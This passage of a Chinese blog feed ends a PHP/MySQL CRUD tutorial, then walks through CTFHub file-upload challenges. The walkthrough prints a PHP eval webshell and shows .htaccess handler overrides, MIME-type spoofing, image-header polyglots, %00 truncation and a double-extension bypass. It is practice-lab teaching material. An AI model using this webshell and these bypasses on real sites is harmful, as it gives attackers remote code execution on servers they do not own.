class="hljs-variable">$result</span>))&#123;<br><span class="hljs-meta">?&gt;</span><br>&lt;tr&gt;<br>&lt;td align=<span class="hljs-string">&quot;center&quot;</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]<span class="hljs-meta">?&gt;</span>&lt;/td&gt;<br>&lt;td align=<span class="hljs-string">&quot;center&quot;</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&lt;/td&gt;<br>&lt;td align=<span class="hljs-string">&quot;center&quot;</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]<span class="hljs-meta">?&gt;</span>&lt;/td&gt;<br>&lt;td align=<span class="hljs-string">&quot;center&quot;</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>]<span class="hljs-meta">?&gt;</span>&lt;/td&gt;<br>&lt;/tr&gt;<br><span class="hljs-meta">&lt;?php</span> &#125; <span class="hljs-meta">?&gt;</span><br>&lt;/table&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/20210415130641730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h2><p>UPDATE 语句用于中修改数据库表中的数据<br>语法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">UPDATE table_name<br>SET column1=value, column2=value2,...<br>WHERE some_column=some_value<br></code></pre></td></tr></table></figure><p>通过实例修改数据表中的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL 更新mydemo表数据</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br> <br><span class="hljs-comment">// 创建连接</span><br><span class="hljs-variable">$con</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// 检测连接</span><br><span class="hljs-keyword">if</span> (mysqli_connect_errno())<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;连接失败: &quot;</span> . mysqli_connect_error();<br>&#125;<br><br>mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;UPDATE mydemo SET Age=20</span><br><span class="hljs-string">WHERE ID=1004&quot;</span>);<br><br>mysqli_close(<span class="hljs-variable">$con</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>mydemo数据表中id=1004的记录age变为20<br><img src="https://img-blog.csdnimg.cn/20210415132140762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><p>DELETE FROM 语句用于从数据库表中删除记录。</p><p>语法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">DELETE <span class="hljs-keyword">FROM</span> table_name<br>WHERE some_column = some_value<br></code></pre></td></tr></table></figure><p>删除一条记录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL 更新mydemo表数据</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br> <br><span class="hljs-comment">// 创建连接</span><br><span class="hljs-variable">$con</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// 检测连接</span><br><span class="hljs-keyword">if</span> (mysqli_connect_errno())<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;连接失败: &quot;</span> . mysqli_connect_error();<br>&#125;<br><br>mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;DELETE FROM mydemo WHERE ID=1004&quot;</span>);<br><br>mysqli_close(<span class="hljs-variable">$con</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>mydmo表中id=4的记录消失<br><img src="https://img-blog.csdnimg.cn/20210415133058835.png" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;菜鸟驿站PHP学习笔记&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;PHP连接MySQL&quot;&gt;&lt;a href=&quot;#PHP连接MySQL&quot; class=&quot;headerlink&quot; title=&quot;PHP连接MySQL&quot;&gt;&lt;/a&gt;PHP连接MySQL</summary>
      
    
    
    
    <category term="编程开发" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    <category term="PHP" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/PHP/"/>
    
    
    <category term="PHP" scheme="http://atkx.top/tags/PHP/"/>
    
    <category term="MYSQL" scheme="http://atkx.top/tags/MYSQL/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-文件上传练习</title>
    <link href="http://atkx.top/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/"/>
    <id>http://atkx.top/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/</id>
    <published>2020-11-22T11:46:56.000Z</published>
    <updated>2021-08-15T03:59:06.537Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（三）</p> <a id="more"></a><h2 id="0x00-无验证"><a href="#0x00-无验证" class="headerlink" title="0x00 无验证"></a>0x00 无验证</h2><p><img src="https://img-blog.csdnimg.cn/2020111821051990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>上传文件相对路径<code>upload/1.php</code><br><img src="https://img-blog.csdnimg.cn/20201118210615644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用蚁剑连接，连接密码为<code>pass</code><br><img src="https://img-blog.csdnimg.cn/20201118210744773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看目录，flag就在这里<br><img src="https://img-blog.csdnimg.cn/20201118210930972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x01-前端验证"><a href="#0x01-前端验证" class="headerlink" title="0x01 前端验证"></a>0x01 前端验证</h2><p><img src="https://img-blog.csdnimg.cn/20201118211350400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马，结果提示该文件不允许上传<br><img src="https://img-blog.csdnimg.cn/2020111821132240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>题目是前端验证，直接查看网页源代码，发现只能上传<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种格式的文件<br><img src="https://img-blog.csdnimg.cn/20201118211703499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>把1.php改为1.jpg，然后上传抓包</p><p><img src="https://img-blog.csdnimg.cn/20201118212718468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.jpg再改为1.php，然后放包<br><img src="https://img-blog.csdnimg.cn/20201118213046598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到相对路径upload/1.php<br><img src="https://img-blog.csdnimg.cn/2020111821314576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还是一样的操作，蚁剑连接，查找目录，找到flag<br><img src="https://img-blog.csdnimg.cn/20201118213340365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x03-htaccess"><a href="#0x03-htaccess" class="headerlink" title="0x03 .htaccess"></a>0x03 .htaccess</h2><p>题目描述：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><p>访问<br><img src="https://img-blog.csdnimg.cn/2020111822095844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源代码，发现文件后缀都被禁用了<br><img src="https://img-blog.csdnimg.cn/2020111822110957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>百度一下hatccess文件，<code>.htaccess</code>是Apache的又一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）</p><p><code>.hatccess</code>文件有两种写法</p><p><strong>第一种方法:</strong><br>下面代码的意思是，只要文件名中包含pass，就会被Apache解析为php文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;FilesMatch <span class="hljs-string">&quot;pass&quot;</span>&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>提示文件名不能为空，命名为<code>3.hatccess</code>,用bp抓包，将3.htaccess改为<code>.htaccass</code>，然后放包<br><img src="https://img-blog.csdnimg.cn/2020111912484428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><code>.htaccass</code>文件上传成功<br><img src="https://img-blog.csdnimg.cn/20201119124911563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>把上面用到的1.php改为3.pass文件，上传文件相对路径<code>upload/3.pass</code><br><img src="https://img-blog.csdnimg.cn/20201119125620833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>蚁剑连接，可以看到上传的文件<br><img src="https://img-blog.csdnimg.cn/20201119125123749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查找flag<br><img src="https://img-blog.csdnimg.cn/20201119125141517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>第二种方法：</strong>·</p><p>内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p>就成功地使该<code>.htaccess</code>文件所在目录及其子目录中的后缀为<code>.jpg</code>的文件被Apache当做php文件</p><p>上传test.htaccess</p><p><img src="https://img-blog.csdnimg.cn/2020111920274848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传成功<br><img src="https://img-blog.csdnimg.cn/20201119202825440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>再上传<code>3.jpg</code>，内容为<code>&lt;?php  @eval($_POST[&quot;pass&quot;]);?&gt;</code> ，获取到上传文件路径<br><img src="https://img-blog.csdnimg.cn/20201119202922137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接，连接成功。<br><img src="https://img-blog.csdnimg.cn/20201119203023188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>参考文章</strong>:<a href="https://blog.csdn.net/wn314/article/details/77074477">文件解析漏洞</a></p><h2 id="0x04-MIME绕过"><a href="#0x04-MIME绕过" class="headerlink" title="0x04 MIME绕过"></a>0x04 MIME绕过</h2><p><img src="https://img-blog.csdnimg.cn/20201120222519718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接上传4.php，提示文件类型不正确<br><img src="https://img-blog.csdnimg.cn/20201120223830616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>来使用MIME绕过，百度了解一下<strong>MIME</strong></p><blockquote><p>  MIME(Multipurpose Internet MailExtensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p></blockquote><p><code>MIME</code>多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式每个MIME类型由两部分组成，前面是数据的大类别，例如声音 audio、图象 Image等,后面定义具体的种类。</p><p>常见的MME类型，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#text表明文件是普通文本</span><br>text/plain<br>text/html<br><span class="hljs-comment">#image表明是某种图像或者动态图(gif)</span><br>image/jpeg<br>image/png<br><span class="hljs-comment">#audio表明是某种音频文件</span><br>audio/mpeg<br>audio/ogg<br>audio<span class="hljs-comment">/*</span><br><span class="hljs-comment">#video表明是某种视频文件</span><br><span class="hljs-comment">video/mp4</span><br><span class="hljs-comment">#application表明是某种二进制数据</span><br><span class="hljs-comment">application/*</span><br><span class="hljs-comment">application/json</span><br><span class="hljs-comment">application/javascript</span><br><span class="hljs-comment">application/ecmascript</span><br><span class="hljs-comment">application/octet-stream</span><br></code></pre></td></tr></table></figure><p>上传<code>4.php</code>，使用bp抓包，修改Content-Typed的值，改成<code>Content-Type: image/jpeg</code>，然后放包<br><img src="https://img-blog.csdnimg.cn/20201120222615911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到文件相对路径<br><img src="https://img-blog.csdnimg.cn/20201120222706592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接，查找目录文件，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20201120222949700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>参考文章: <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME 类型</a></p><h2 id="0x05-文件头检查"><a href="#0x05-文件头检查" class="headerlink" title="0x05 文件头检查"></a>0x05 文件头检查</h2><p><img src="https://img-blog.csdnimg.cn/20201122155831873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马5.php，提示文件类型不正确</p><p><img src="https://img-blog.csdnimg.cn/20201122155907113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br> 再把5.php修改成5.jpg上传，发现提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122160052550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>尝试<strong>MME绕过</strong>，上传<code>5.php</code>，抓包，修改Content-Typed的值，然后放包，发现提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122160839518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>应该是对文件内容进行了检测，来制作一个图片码<code>m.php</code><br><img src="https://img-blog.csdnimg.cn/20201122162645668.png#pic_center" alt="在这里插入图片描述"><br>抓包修改Content-Type的值，放包<br><img src="https://img-blog.csdnimg.cn/2020112216332349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>结果提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122193529247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>看了大师傅的wp，说尽量换小一点的图片，就会成功，这次换了一个非常小的图片，重新制作图片马<br><img src="https://img-blog.csdnimg.cn/2020112219263730.png#pic_center" alt="在这里插入图片描述"></p><p>上传flag.php，抓包修改Content-Type的值为<code>image/png</code><br><img src="https://img-blog.csdnimg.cn/20201122192734886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到上传路径<br><img src="https://img-blog.csdnimg.cn/2020112219282666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>蚁剑连接，拿到flag<br><img src="https://img-blog.csdnimg.cn/20201122192926706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x06-00截断"><a href="#0x06-00截断" class="headerlink" title="0x06 00截断"></a>0x06 00截断</h2><p>了解一下00截断，<a href="http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html">关于上传中的00截断分析</a><br><img src="https://img-blog.csdnimg.cn/20201122170816232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马，提示文件类型不匹配, 但在url栏出现了路径信息<br><img src="https://img-blog.csdnimg.cn/20201122165152579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源代码<br><img src="https://img-blog.csdnimg.cn/20201122165304568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传shell.jpg，抓包<br><img src="https://img-blog.csdnimg.cn/20201122165938867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>构造00截断，添加<code>shell.php%00</code>，放包<br><img src="https://img-blog.csdnimg.cn/2020112217004529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功路径为<code>upload/shell.php</code>，蚁剑连接<br><img src="https://img-blog.csdnimg.cn/2020112217043423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>拿到flag<br><img src="https://img-blog.csdnimg.cn/2020112217050469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x07-双写后缀"><a href="#0x07-双写后缀" class="headerlink" title="0x07 双写后缀"></a>0x07 双写后缀</h2><p><img src="https://img-blog.csdnimg.cn/20201122171341824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马shell.php，虽然上传成功，但后缀却消失了<br><img src="https://img-blog.csdnimg.cn/20201122171256124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源码，<code>$name = str_ireplace($blacklist, &quot;&quot;, $name);</code>，变量<code>blacklist</code>里面的值会被替换，后缀被过滤了<br><img 